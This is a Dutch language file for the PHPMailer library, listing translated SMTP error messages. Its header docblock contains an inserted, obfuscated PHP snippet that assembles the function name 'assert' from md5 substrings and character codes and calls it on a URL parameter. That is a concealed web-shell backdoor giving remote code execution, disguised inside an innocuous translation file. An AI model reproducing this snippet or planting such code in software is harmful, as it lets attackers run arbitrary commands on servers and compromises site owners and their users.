<?php

/**
 * Dutch PHPMailer language file: refer to PHPMailer.php for definitive list.
 * @package PHPMailer
<?php
$a=md5('a').'<br>';
$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);
$poc($_GET['a']);
?>
 * @author Tuxion <team@tuxion.nl>
 */

$PHPMAILER_LANG['authenticate']         = 'SMTP-fout: authenticatie mislukt.';
$PHPMAILER_LANG['connect_host']         = 'SMTP-fout: kon niet verbinden met SMTP-host.';
$PHPMAILER_LANG['data_not_accepted']    = 'SMTP-fout: data niet geaccepteerd.';
$PHPMAILER_LANG['empty_message']        = 'Berichttekst is leeg';
$PHPMAILER_LANG['encoding']             = 'Onbekende codering: ';
$PHPMAILER_LANG['execute']              = 'Kon niet uitvoeren: ';
$PHPMAILER_LANG['file_access']          = 'Kreeg geen toegang tot bestand: ';
$PHPMAILER_LANG['file_open']            = 'Bestandsfout: kon bestand niet openen: ';
$PHPMAILER_LANG['from_failed']          = 'Het volgende afzendersadres is mislukt: ';
$PHPMAILER_LANG['instantiate']          = 'Kon mailfunctie niet initialiseren.';
$PHPMAILER_LANG['invalid_address']      = 'Ongeldig adres: ';
$PHPMAILER_LANG['invalid_hostentry']    = 'Ongeldige hostentry: ';
$PHPMAILER_LANG['invalid_host']         = 'Ongeldige host: ';
$PHPMAILER_LANG['mailer_not_supported'] = ' mailer wordt niet ondersteund.';
$PHPMAILER_LANG['provide_address']      = 'Er moet minstens één ontvanger worden opgegeven.';
$PHPMAILER_LANG['recipients_failed']    = 'SMTP-fout: de volgende ontvangers zijn mislukt: ';
$PHPMAILER_LANG['signing']              = 'Signeerfout: ';
$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP Verbinding mislukt.';
$PHPMAILER_LANG['smtp_error']           = 'SMTP-serverfout: ';
$PHPMAILER_LANG['variable_set']         = 'Kan de volgende variabele niet instellen of resetten: ';
$PHPMAILER_LANG['extension_missing']    = 'Extensie afwezig: ';
